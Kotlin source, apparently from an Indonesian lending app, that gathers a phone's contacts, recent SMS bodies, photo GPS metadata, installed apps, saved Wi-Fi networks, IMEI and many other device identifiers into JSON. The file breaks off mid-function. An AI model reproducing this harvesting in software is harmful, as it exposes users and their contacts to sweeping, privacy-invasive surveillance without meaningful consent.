package com.indonesia.tunaifince.kt.manager

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.content.res.Resources
import android.database.Cursor
import android.database.sqlite.SQLiteException
import android.hardware.Sensor
import android.hardware.SensorManager
import android.location.*
import android.media.ExifInterface
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.TelephonyManager
import android.telephony.gsm.GsmCellLocation
import android.text.TextUtils
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.os.ConfigurationCompat
import com.google.gson.Gson
import com.google.gson.JsonArray
import com.indonesia.tunaifince.kt.base.App
import com.indonesia.tunaifince.kt.http.model.AppListBean
import com.indonesia.tunaifince.kt.http.model.ContactBean
import com.indonesia.tunaifince.kt.http.model.PhotoInfoBean
import com.indonesia.tunaifince.kt.utils.MMKVCache
import com.indonesia.tunaifince.kt.utils.MMKVCache.latitude
import com.indonesia.tunaifince.kt.utils.MMKVCache.longitude
import com.mobile.mobilehardware.base.BaseData
import com.mobile.mobilehardware.battery.BatteryHelper
import com.mobile.mobilehardware.bluetooth.BluetoothHelper
import com.mobile.mobilehardware.build.BuildHelper
import com.mobile.mobilehardware.cpu.CpuHelper
import com.mobile.mobilehardware.debug.DebugHelper
import com.mobile.mobilehardware.emulator.EmulatorHelper
import com.mobile.mobilehardware.network.NetWorkHelper
import com.mobile.mobilehardware.root.RootHelper
import com.mobile.mobilehardware.screen.ScreenHelper
import com.mobile.mobilehardware.sdcard.SDCardHelper
import com.mobile.mobilehardware.setting.SettingsHelper
import com.mobile.mobilehardware.signal.SignalHelper
import com.mobile.mobilehardware.simcard.SimCardHelper
import com.mobile.mobilehardware.uniqueid.PhoneIdHelper
import com.mobile.mobilehardware.useragent.UserAgentHelper
import java.io.File
import java.io.IOException
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.*
import kotlin.math.pow
import kotlin.math.sqrt
import com.google.gson.JsonObject as JsonObject1

@SuppressLint("Range")
object CollectData {

    /**
     * 通讯录
     */
    fun getContacts(): JsonArray? {
        val contacts = arrayListOf<ContactBean>()
        val cursor = App.instance.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
                ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED,
                ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
            ), null, null, null
        )
        while (cursor?.moveToNext() == true) {
            //新建一个联系人实例
            val item = ContactBean()
            //获取联系人姓名
            item.name =
                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))

            //得到手机号码
            var phoneNumber =
                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            //当手机号码为空的或者为空字段 跳过当前循环
            if (phoneNumber.isNullOrBlank()) {
                continue
            } else {
                item.phone = phoneNumber.replace("[^\\d]".toRegex(), "")
            }
            //最新更新时间
            item.lastUpdateTime =
                if (cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP)) == 0L) {
                    -1L
                } else {
                    cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP))
                }
            //最新联系时间
            item.lastContactTime =
                if (cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED)) == 0L) {
                    -1L
                } else {
                    cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED))
                }

            //联系次数
            item.contactTimes =
                if (cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED)) == 0) {
                    -1
                } else {
                    cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED))
                }
            contacts.add(item)
        }
        cursor?.close()
        if (contacts.size > 0) {
            return Gson().toJsonTree(contacts).asJsonArray
        }
        return null
    }

    /**
     * 获取应用列表数据
     */
    fun getAppList(): JsonArray? {
        val pm = App.instance.packageManager
        val packages = pm.getInstalledPackages(0)
        val appList = arrayListOf<AppListBean>()
        for (info in packages) {
            val item = AppListBean().apply {
                app_name = info.applicationInfo.loadLabel(pm).toString()
                app_type = if (isSystemApp(info)) 1 else 0
                package_name = info.packageName
                version_name = info.versionName
                flags = info.applicationInfo.flags
                version_code = info.versionCode

                try {
                    val appInfo = pm.getApplicationInfo(info.packageName, 0)
                    val appFile = appInfo.sourceDir
                    in_time = File(appFile).lastModified()
                    if (info.lastUpdateTime <= 0) {
                        up_time = in_time
                    } else {
                        up_time = info.lastUpdateTime
                    }
                } catch (e: Exception) {
                    in_time = info.firstInstallTime  //安装时间
                    up_time = info.lastUpdateTime   //更新时间
                }
            }
            appList.add(item)
        }

        if (appList.size > 0) {
            return Gson().toJsonTree(appList).asJsonArray
        }
        return null
    }

    // 通过packName得到PackageInfo，作为参数传入即可
    private fun isSystemApp(pi: PackageInfo): Boolean {
        val isSysApp = pi.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM == 1
        val isSysUpd = pi.applicationInfo.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP == 1
        return isSysApp || isSysUpd
    }

    /**
     * 图片信息
     *
     * @return
     */
    fun getPhotoInfo(): JsonArray? {
        val photoList = arrayListOf<PhotoInfoBean>()
        val currentTime = System.currentTimeMillis()
        val formatter = SimpleDateFormat("yyyy:MM:dd HH:mm:ss")
        val sim = formatter.format(currentTime)
        sim.replace(" 24", " 00")

        val mImageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projImage = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.DISPLAY_NAME
        )
        val mCursor = App.instance.contentResolver.query(
            mImageUri,
            projImage,
            MediaStore.Images.Media.MIME_TYPE + "=? or " + MediaStore.Images.Media.MIME_TYPE + "=? or " + MediaStore.Images.Media.MIME_TYPE + "=?",
            arrayOf("image/jpeg", "image/png", "image/jpg"),
            MediaStore.Images.Media.DATE_MODIFIED + " desc"
        )
        if (mCursor != null) {
            while (mCursor.moveToNext()) {

                val item = PhotoInfoBean()

                // 获取图片的路径
                val path = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DATA))
                val displayName =
                    mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME))
                try {
                    val exifInterface = ExifInterface(path)
                    var time = exifInterface.getAttribute(ExifInterface.TAG_DATETIME)

                    if (displayName.isNullOrBlank()) {
                        continue
                    }
                    if (time.isNullOrEmpty()) {
                        val file = File(path)
                        val modifieTime = file.lastModified()
                        time = formatter.format(modifieTime)
                    }
                    if (sim.isNullOrBlank()) {
                        continue
                    }
                    item.apply {
                        longitudeG =
                            exifInterface.getAttribute(ExifInterface.TAG_GPS_LONGITUDE)
                                .toString() //	图片经度
                        latitudeG =
                            exifInterface.getAttribute(ExifInterface.TAG_GPS_LATITUDE)
                                .toString() //图片纬度
                        model =
                            exifInterface.getAttribute(ExifInterface.TAG_MODEL).toString() //拍摄机型
                        date = time?.replace(" 24", " 00").toString() //照片拍摄时间，日期
                        name = displayName  //照片名
                        make = exifInterface.getAttribute(ExifInterface.TAG_MAKE)
                            .toString() //ExifInterface
                        width =
                            mCursor.getInt(mCursor.getColumnIndex(MediaStore.Images.Media.WIDTH)) //照片宽度
                        height =
                            mCursor.getInt(mCursor.getColumnIndex(MediaStore.Images.Media.HEIGHT)) //照片宽度
                    }

                    photoList.add(item)
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }
            mCursor.close()
        }

        if (photoList.size > 0) {
            return Gson().toJsonTree(photoList).asJsonArray
        }
        return null
    }

    /**
     * smsNum 短信数
     */
    fun getSMSInfo(smsNum: Int): JsonArray {
        val SMS_URI_ALL = "content://sms/"
        val jsonarray = JsonArray() //json数组
        //   val allContacts = NewContactUtils.getAllContacts()
        try {
            val uri = Uri.parse(SMS_URI_ALL)
            val projection = arrayOf(
                "_id", "address", "person",
                "body", "date", "type", "read", "status", "subject"
            )
            val cur = App.instance.contentResolver.query(
                uri, projection, null,
                null, "date desc"
            ) // 获取手机内部短信
            if (cur != null && cur.count > 0) {
                while (cur.moveToNext()) {
                    if (cur.position > smsNum - 1) {
                        continue
                    }
                    val jsonObj = JsonObject1() //对象，json形式
                    var strAddress = cur.getString(cur.getColumnIndex("address"))
                    if (strAddress.isNullOrBlank().not()) {
                        strAddress = strAddress.replace("[^\\d]".toRegex(), "")
                    }
                    val strBody = cur.getString(cur.getColumnIndex("body"))
                    if (strBody.isEmpty()) {
                        continue
                    }
                    val longDate = cur.getLong(cur.getColumnIndex("date"))
                    if (longDate <= 0) {
                        continue
                    }
                    if (strBody.isEmpty()) {
                        continue
                    }
                    val read = cur.getInt(cur.getColumnIndex("read"))
                    val status = cur.getInt(cur.getColumnIndex("status"))
                    val subject = cur.getString(cur.getColumnIndex("subject"))
                    val intType = cur.getInt(cur.getColumnIndex("type"))
                    val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                    val d = Date(longDate)
                    val strDate = dateFormat.format(d).replace(" 24", " 00")
                    jsonObj.addProperty("address", strAddress) //另一方的手机号
                    //   jsonObj.addProperty("person", getDisplayName(allContacts, strAddress))
                    //     jsonObj.addProperty("phone", strAddress)
                    jsonObj.addProperty("type", intType)  ///短信类型 0-发送，1-接收
                    jsonObj.addProperty("sendOrderReceiveTime", strDate) //收或者发送的时间
                    jsonObj.addProperty("body", strBody) //消息的正文
                    jsonObj.addProperty("subject", subject) //消息的主题，如果存在
                    jsonObj.addProperty("status", status) //消息的状态值，如果未收到状态，则为-1
                    jsonObj.addProperty("read", read)  //消息是否被读取
                    jsonarray.add(jsonObj)
                }
                cur.close()
            }
        } catch (ex: SQLiteException) {
            ex.printStackTrace()
        }
        Log.e("TAG", "getSmsInPhone: $jsonarray")
        return jsonarray
    }

    // 根据手机号查询用户名
    private fun getDisplayName(allContacts: ArrayList<ContactBean>, strAddress: String): String {
        if (TextUtils.isEmpty(strAddress)) {
            return "unknown"
        }
        for (bean in allContacts) {
            if (strAddress == bean.phone) {
                return bean.name
            }
        }


        return "unknown"
    }

    /**
     * 搜集设备信息
     */
    fun collectDeviceInfo(): JsonObject1 {
        val deviceObject = JsonObject1()
        var mediaObject = getMediaInfo()
        for (key in mediaObject.keySet()) {
            deviceObject.add(key, mediaObject.get(key))
        }
        deviceObject.add("battery_status", getBatteryInfo())  //battery_status
        deviceObject.add("general_data", getGeneralInfo()) //general_data
        deviceObject.add("hardware", getHardWareInfo()) //hardware
        deviceObject.add("other_data", getOtherInfo())  //other_data
        deviceObject.add("network", getNetWorkInfo()) //network
        deviceObject.add("location", getLocationInfo()) //location
        deviceObject.add("storage", getStorageInfo()) //storage
        return deviceObject
    }


    private fun getMediaInfo(): JsonObject1 {
        val deviceObject = JsonObject1()

        try {
            var contentProvider = App.instance.contentResolver
            var query: Cursor? = null
            query = contentProvider.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Video.Media.TITLE),
                null, null, MediaStore.Video.Media.DEFAULT_SORT_ORDER
            )
            deviceObject.addProperty("video_external", query!!.count)
            query.close()

            query = contentProvider.query(
                MediaStore.Video.Media.INTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Video.Media.TITLE),
                null, null, MediaStore.Video.Media.DEFAULT_SORT_ORDER
            )
            deviceObject.addProperty("video_internal", query!!.count)
            query.close()
            query = contentProvider.query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, arrayOf(MediaStore.Audio.Media.TITLE),
                null, null, MediaStore.Audio.Media.DEFAULT_SORT_ORDER
            )
            deviceObject.addProperty("audio_external", query!!.count)
            query.close()
            query = contentProvider.query(
                MediaStore.Audio.Media.INTERNAL_CONTENT_URI, arrayOf(MediaStore.Audio.Media.TITLE),
                null, null, MediaStore.Audio.Media.DEFAULT_SORT_ORDER
            )
            deviceObject.addProperty("audio_internal", query!!.count)
            query.close()
            query = contentProvider.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media.TITLE), null, null,
                MediaStore.Images.Media.DEFAULT_SORT_ORDER
            )
            deviceObject.addProperty("images_external", query!!.count)
            query.close()
            query = contentProvider.query(
                MediaStore.Images.Media.INTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media.TITLE), null, null,
                MediaStore.Images.Media.DEFAULT_SORT_ORDER
            )
            deviceObject.addProperty("images_internal", query!!.count)
            query.close()


            var count = 0
            val directory = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DOWNLOADS
            )
            if (directory != null) {
                if (Build.VERSION.SDK_INT >= 29) {
                    val files = directory.listFiles()
                    if (files != null) count = files.size
                } else {
                    count = countFileNumber(directory)
                }
            }
            deviceObject.addProperty("download_files", count)
            query = contentProvider.query(
                ContactsContract.Groups.CONTENT_URI,
                null, null, null, null
            )
            deviceObject.addProperty("contact_group", query!!.count)
            query.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return deviceObject
    }

    @SuppressLint("ObsoleteSdkInt")
    private fun getStorageInfo(): JsonObject1 {
        val storageObject = JsonObject1()
        SDCardHelper.mobGetSdCard()
        storageObject.addProperty("ram_total_size", MemoryInfoUtils.getTotalMemory(App.instance)) //ram_total_size	总内存⼤小
        storageObject.addProperty("ram_usable_size", MemoryInfoUtils.getAvailMemory(App.instance)) //ram_usable_size  string	内存可⽤⼤小
        var memory_card_size: Long = -1
        var memory_card_size_use: Long = -1
        if (SDCardHelper.mobGetSdCard().getBoolean(BaseData.SDCard.IS_SDCARD_ENABLE)) {
            val stat = StatFs(SDCardHelper.mobGetSdCard().getString(BaseData.SDCard.SDCARD_PATH))
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                memory_card_size = stat.blockCountLong * stat.blockSizeLong
                memory_card_size_use =
                    (stat.blockCountLong - stat.availableBlocksLong) * stat.blockSizeLong
            } else {
                memory_card_size = (stat.blockCount * stat.blockSize).toLong()
                memory_card_size_use =
                    ((stat.blockCount - stat.availableBlocks) * stat.blockSize).toLong()
            }
        }
        storageObject.addProperty("memory_card_size", memory_card_size) // memory_card_size	内存卡⼤小
        storageObject.addProperty("memory_card_size_use", memory_card_size_use)  //memory_card_size_use string	内存卡已使用量
        //总的存储空间
        storageObject.addProperty(
            "internal_storage_total", //internal_storage_total 	总存储⼤小
            MemoryInfoUtils.getRomSpaceTotal(App.instance)
        )
        //可用存储空间
        storageObject.addProperty(
            "internal_storage_usable", //internal_storage_usable 可⽤存储⼤小
            MemoryInfoUtils.getRomSpace(App.instance)
        )

        storageObject.addProperty(
            "main_storage", //main_storage	主存储路径
            App.instance.filesDir!!.parentFile?.parentFile?.absolutePath
        )
        var externalStorage = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            Environment.getExternalStorageDirectory().absolutePath
        } else {
            App.instance.getExternalFilesDir(null)!!.parentFile?.parentFile?.absolutePath
        }
        storageObject.addProperty(
            "external_storage", externalStorage //external_storage  string	外部存储路径
        )
        return storageObject
    }


    private fun getLocationInfo(): JsonObject1 {
        val locationObject = JsonObject1()
        val gps = JsonObject1()
        val la: String = if (latitude == 0.00) "-1" else latitude.toString()
        val lo: String = if (longitude == 0.00) "-1" else longitude.toString()
        gps.addProperty("latitude", la) //latitude
        gps.addProperty("longitude", lo) //longitude
        locationObject.add("gps", gps)
        if (addressDefault != null) {
            locationObject.addProperty(
                "gps_address_province", //gps_address_province GPS解析的省
                addressDefault?.adminArea
            )
            locationObject.addProperty(
                "gps_address_city",//gps_address_city  GPS解析的市
                addressDefault?.locality
            )
            locationObject.addProperty(
                "gps_address_large_district",//gps_address_large_district
                addressDefault?.subLocality
            )
            locationObject.addProperty(
                "gps_address_small_district",//gps_address_small_district
                addressDefault?.featureName
            )
            locationObject.addProperty(
                "gps_address_street", //gps_address_street  GPS解析地址（根据经纬度解析）
                addressDefault?.thoroughfare
            )
        }
        return locationObject
    }

    @SuppressLint("WifiManagerLeak", "MissingPermission")
    private fun getNetWorkInfo(): JsonObject1 {
        val netWorkObject = JsonObject1()
        var wifiCount = 0
        if (NetWorkHelper.mobGetMobNetWork().getBoolean(BaseData.NetWork.NETWORK_AVAILABLE) &&
            NetWorkHelper.mobGetMobNetWork().getString(BaseData.NetWork.TYPE).equals("WIFI")
        ) {
            val currentWifi = JsonObject1()
            currentWifi.addProperty(
                "bssid", //bssid wifi BSSID
                SignalHelper.mobGetNetRssi().getString(BaseData.Signal.BSSID)
            )
            currentWifi.addProperty(
                "name", //name
                SignalHelper.mobGetNetRssi().getString(BaseData.Signal.SSID)
            )
            currentWifi.addProperty(
                "ssid", //ssid
                SignalHelper.mobGetNetRssi().getString(BaseData.Signal.SSID)
            )
            currentWifi.addProperty(
                "mac", //mac
                SignalHelper.mobGetNetRssi().getString(BaseData.Signal.MAC_ADDRESS)
                    .replace(BaseData.UNKNOWN_PARAM, "")
            )
            netWorkObject.add("current_wifi", currentWifi) //current_wifi 当前连接的wifi信息
            wifiCount++
        }
        netWorkObject.addProperty(
            "IP", //IP
            SignalHelper.mobGetNetRssi().getString(BaseData.Signal.N_IP_ADDRESS)
        )
        val array = JsonArray()
        val wifiMgr = App.instance.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val networks = wifiMgr.configuredNetworks
        if (networks != null) for (configuration in networks) {
            val oldWifi = JsonObject1()
            oldWifi.addProperty(
                "bssid",  //bssid
                if (TextUtils.isEmpty(configuration.BSSID)) "" else configuration.BSSID.replace(
                    "%".toRegex(),
                    "-"
                )
            )
            oldWifi.addProperty(
                "name",
                if (TextUtils.isEmpty(configuration.SSID)) "" else configuration.SSID.replace(
                    "%".toRegex(),
                    "-"
                )
            )
            oldWifi.addProperty(
                "ssid",  //ssid
                if (TextUtils.isEmpty(configuration.SSID)) "" else configuration.SSID.replace(
                    "%".toRegex(),
                    "-"
                )
            )
            array.add(oldWifi)
            wifiCount++
        }
        netWorkObject.addProperty("wifi_count", wifiCount) //wifi_count  string	wifi数量
        netWorkObject.add("configured_wifi", array) //configured_wifi 当前所有配置的wifi信息
        return netWorkObject
    }

    private fun getOtherInfo(): JsonObject1 {
        val otherObject = JsonObject1()
        otherObject.addProperty(
            "last_boot_time", //last_boot_time  最后一次启动时间
            System.currentTimeMillis() - SystemClock.elapsedRealtime()
        )
        otherObject.addProperty("root_jailbreak", if (RootHelper.mobileRoot()) 1 else 0) //root_jailbreak string	是否root
        otherObject.addProperty("keyboard", App.instance.resources.configuration.keyboard) //keyboard 连接到设备的键盘的种类
        otherObject.addProperty(
            "simulator", //simulator string	是否为模拟器
            if (EmulatorHelper.mobCheckEmulator()
                    .getBoolean(BaseData.Emulator.CHECK_BUILD)
            ) 1 else 0
        )
        otherObject.addProperty("dbm", SignalHelper.mobGetNetRssi().getInt(BaseData.Signal.RSSI)) //dbm 当前手机主卡信号强度
        return otherObject
    }

    private fun getHardWareInfo(): JsonObject1 {
        val hardWareObject = JsonObject1()
        var deviceName =
            BluetoothHelper.mobGetMobBluetooth().getString(BaseData.Bluetooth.PHONE_NAME)
        if (deviceName.equals(BaseData.UNKNOWN_PARAM)) {
            deviceName = BuildHelper.mobGetBuildInfo().getString(BaseData.Build.USER)
        }
        hardWareObject.addProperty("device_name", deviceName) //device_name  设备名称
        hardWareObject.addProperty(
            "bootloader", //bootloader  程序
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.BOOTLOADER)
                .replace(BaseData.UNKNOWN_PARAM, "")
        )
        hardWareObject.addProperty(
            "serial", //serial 	序列号
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.SERIAL)
                .replace(BaseData.UNKNOWN_PARAM, "")
        )
        hardWareObject.addProperty(
            "fingerprint", //fingerprint  指纹
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.FINGERPRINT)
        )
        hardWareObject.addProperty(
            "host", //host  //  string	主机
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.HOST)
        )
        hardWareObject.addProperty(
            "hardware", //hardware  string	硬件
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.HARDWARE)
        )
        hardWareObject.addProperty(
            "release", //release  string	系统版本
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.RELEASE_VERSION)
        )
        hardWareObject.addProperty(
            "radio_version", //radio_version  电台版
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.RADIO)
        )
        hardWareObject.addProperty(
            "tags", //tags  string	标签
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.TAGS)
        )
        hardWareObject.addProperty(
            "time", //time
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.TIME)
        )
        hardWareObject.addProperty(
            "type",  // type
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.TYPE)
        )
        hardWareObject.addProperty(
            "brand", //brand string	设备名牌
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.BRAND)
        )
        hardWareObject.addProperty(
            "display", //display  string	显示
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.DISPLAY)
        )
        hardWareObject.addProperty(
            "p_id", //p_id
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.ID)
        )
        hardWareObject.addProperty(
            "device", //device
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.DEVICE)
        )
        hardWareObject.addProperty(
            "user", //user
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.USER)
        )
        hardWareObject.addProperty(
            "sdk_version",  // sdk_version SDK版本
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.SDK_INT)
        )
        hardWareObject.addProperty(
            "model",  // model  设备型号
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.MODEL)
        )
        hardWareObject.addProperty(
            "product",  //product 名称
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.PRODUCT)
        )
        hardWareObject.addProperty(
            "cpu_type", // cpu_type
            CpuHelper.mobGetCpuInfo().getString(BaseData.Cpu.CPU_ABI)
        )
        hardWareObject.addProperty(
            "manufacturer_name", //manufacturer_name  制造商名称
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.MANUFACTURER)
        )
        hardWareObject.addProperty(
            "board",  //board
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.BOARD)
        )
        hardWareObject.addProperty(
            "serial_number", // serial_number  设备序列号
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.SERIAL)
        )
        hardWareObject.addProperty("uniquePsuedoId", PhoneIdHelper.getUniqueID())  //设备唯一标识
        hardWareObject.addProperty("user_agent", UserAgentHelper.getDefaultUserAgent())  //
        val width = ScreenHelper.mobGetMobScreen(null).getString(BaseData.Screen.WIDTH)
        val height = ScreenHelper.mobGetMobScreen(null).getString(BaseData.Screen.HEIGHT)
        hardWareObject.addProperty("width", width)
        hardWareObject.addProperty("height", height)
        hardWareObject.addProperty("resolution", "$width*$height") //resolution 	屏幕分辨率
        val x = width.toDouble().pow(2.0)
        val y = height.toDouble().pow(2.0)
        val diagonal = sqrt(x + y)
        val dens = ScreenHelper.mobGetMobScreen(null).getString(BaseData.Screen.DENSITY_DPI).toInt()
        val screenInches = diagonal / dens.toDouble()
        hardWareObject.addProperty("physical_size", screenInches) //physical_size  物理尺寸
        return hardWareObject
    }

    @SuppressLint("MissingPermission")
    private fun getGeneralInfo(): JsonObject1 {
        val generalObject = JsonObject1()
        // Adjust 获取googleAdId
        generalObject.addProperty("gaid", MMKVCache.googleAdId) //gaid
        generalObject.addProperty(
            "and_id",  //and_id  android_id
            SettingsHelper.mobGetMobSettings().getString(BaseData.Settings.ANDROID_ID)
        )
        generalObject.addProperty("uuid", PhoneIdHelper.getUniqueID())  //uuid
        val phoneType = App.instance.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        generalObject.addProperty("phone_type", phoneType.phoneType) //phone_type 指示设备电话类型的常量。 这表示用于传输语音呼叫的无线电的类型
        NetWorkHelper.mobGetMobNetWork()
        generalObject.addProperty("network_operator_name", phoneType.simOperatorName)  //network_operator_name 网络运营商名称
        generalObject.addProperty("network_type", phoneType.networkType.toString() + "") //network_type  	网络类型

        if (App.instance.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
            App.instance.checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
        ) {
            generalObject.addProperty("phone_number", phoneType.line1Number)  //phone_number 手机号
        } else {
            generalObject.addProperty("phone_number", "")   //
        }
        val networkOperator = phoneType.networkOperator
        generalObject.addProperty("network_operator", networkOperator)  //network_operator String	网络运营商名称
        if (!TextUtils.isEmpty(networkOperator)) {
            val mcc = networkOperator.substring(0, 3).toInt()
            val mnc = networkOperator.substring(3).toInt()
            generalObject.addProperty("mcc", mcc)  //mcc
            generalObject.addProperty("mnc", mnc)   //mnc
        }
        val location = phoneType.cellLocation
        if (location is GsmCellLocation) {
            val cellId = location.cid
            generalObject.addProperty("cid", cellId)  //cid	单元ID
        }

        var language: String? = null
        var locale_iso_3_language: String? = null
        var locale_display_language: String? = null
        var locale_iso_3_country: String? = null
        var locale: Locale? = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val listCompat = ConfigurationCompat.getLocales(Resources.getSystem().configuration)
            if (listCompat.size() > 0) locale = listCompat[0]
        } else {
            locale = Locale.getDefault()
        }
        if (locale != null) {
            language = locale.language
            locale_iso_3_language = locale.isO3Language
            locale_display_language = locale.displayName
            locale_iso_3_country = locale.isO3Country
        }
        generalObject.addProperty("language", language)  // language 当前环境语言
        generalObject.addProperty("locale_iso_3_language", locale_iso_3_language) //locale_iso_3_language 语言环境的三字母缩写
        generalObject.addProperty("locale_iso_3_country", locale_iso_3_country)  //locale_iso_3_country locale_iso_3_country
        generalObject.addProperty("locale_display_language", locale_display_language)  //locale_display_language String	此用户显示的语言环境语言的名称
        generalObject.addProperty(
            "mac",  //mac
            SignalHelper.mobGetNetRssi().getString(BaseData.Signal.MAC_ADDRESS)
                .replace(BaseData.UNKNOWN_PARAM, "")
        )
        var imei1 = SimCardHelper.mobileSimInfo().getString(BaseData.SimCard.SIM1_IMEI)
        var imei2 = SimCardHelper.mobileSimInfo().getString(BaseData.SimCard.SIM2_IMEI)
        var imei = "$imei1,$imei2"
        generalObject.addProperty("imei", imei.replace(",unknown", "")) //imei
        generalObject.addProperty(
            "is_usb_debug", //is_usb_debug  是否开启debug调试
            DebugHelper.getDebuggingData().getString(BaseData.Debug.IS_OPEN_DEBUG)
        )
        generalObject.addProperty("is_using_Vpn", isVpn()) // is_using_vpn 是否使用vpn
        generalObject.addProperty(
            "is_using_proxy_port",  //is_using_proxy_port  是否使用代理
            SignalHelper.mobGetNetRssi().getString(BaseData.Signal.PROXY)
        )
        generalObject.addProperty(
            "manufacturer", // manufacturer  制造商
            BuildHelper.mobGetBuildInfo().getString(BaseData.Build.MANUFACTURER)
        )
        generalObject.addProperty("time_zone_id", TimeZone.getDefault().id) // time_zone_id  时区的ID
        generalObject.addProperty("elapsed_realtime", SystemClock.elapsedRealtime()) //  elapsed_realtime 开机时间到现在的毫秒数
        generalObject.add("sensor_list", getSensorList()) //sensor_list  传感器信息
        return generalObject
    }

    //传感器信息
    private fun getSensorList(): JsonArray {
        val array = JsonArray()
        val sensorManager = App.instance.getSystemService(Context.SENSOR_SERVICE) as SensorManager
        val sensors = sensorManager.getSensorList(Sensor.TYPE_ALL)
        for (item in sensors) {
            val `object` = JsonObject1()
            `object`.addProperty("minDelay", item.minDelay)  //minDelay
            `object`.addProperty("maxRange", item.maximumRange)  //maxRange
            `object`.addProperty("name", item.name) //name
            `object`.addProperty("power", item.power)  //power
            `object`.addProperty("resolution", item.resolution) //resolution String	屏幕分辨率
            `object`.addProperty("type", item.type)  //type
            `object`.addProperty("vendor", item.vendor) //vendor
            `object`.addProperty("version", item.version)  //version
            array.add(`object`)
        }
        return array
    }

    /**
     * 电池信息
     */
    private fun getBatteryInfo(): JsonObject1 {
        val tempBattery = BatteryHelper.mobGetBattery()
        val batteryObject = JsonObject1()
        batteryObject.addProperty(
            "battery_pct",  //battery_pct	int	电池百分⽐
            tempBattery.getString(BaseData.Battery.BR).replace("%", "")
        )
        var isUsb = if (tempBattery.getString(BaseData.Battery.PLUG_STATE)!! == "usb") 1 else -1
        batteryObject.addProperty(
            "is_usb_charge", isUsb.toString()   //is_usb_charge 是否USB充电
        )
        var isAc = if (tempBattery.getString(BaseData.Battery.PLUG_STATE)!! == "ac") 1 else -1
        batteryObject.addProperty(
            "is_ac_charge", isAc.toString()  //is_ac_charge 是否交流充电
        )

        var status = -1
        if (tempBattery.getString(BaseData.Battery.STATUS)!! == "charging") 1 else -1
        batteryObject.addProperty(
            "is_charging", status.toString() //is_charging 是否正在充电
        )

        return batteryObject
    }

    private fun countFileNumber(directory: File): Int {
        var n = 0
        if (!directory.isDirectory) {
            return 1
        }
        val files = directory.listFiles()
        for (direc in files) {
            n += countFileNumber(direc)
        }
        return n
    }

    private fun isVpn(): Boolean {
        var isVpn = false
        val networkList: MutableList<String> = ArrayList()
        try {
            for (networkInterface in Collections.list(NetworkInterface.getNetworkInterfaces())) {
